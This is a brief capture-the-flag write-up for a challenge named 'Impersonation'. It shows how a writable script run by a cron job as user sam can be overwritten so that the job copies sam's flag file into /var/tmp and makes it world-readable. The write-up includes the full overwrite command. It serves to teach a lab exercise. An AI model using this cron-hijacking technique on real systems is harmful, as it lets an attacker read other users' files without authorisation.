# Impersonation [350 points] (1 solves)
```
> cat /etc/cron.d/cron_sam 

*/1 * * * * sam /home/sam/cron.sh > /dev/null 2>&1
```
We can see that the crontab run cron.sh every minute as user sam, then we can use `/home/sam/cron.sh` to get the flag:
```bash
echo '#!/bin/bash
/bin/cat /home/sam/flag > /var/tmp/flag.txt
/bin/chmod 777 /var/tmp/flag.txt' > /home/sam/cron.sh
```
After that, the flag will appear in `/var/tmp/flag.txt`.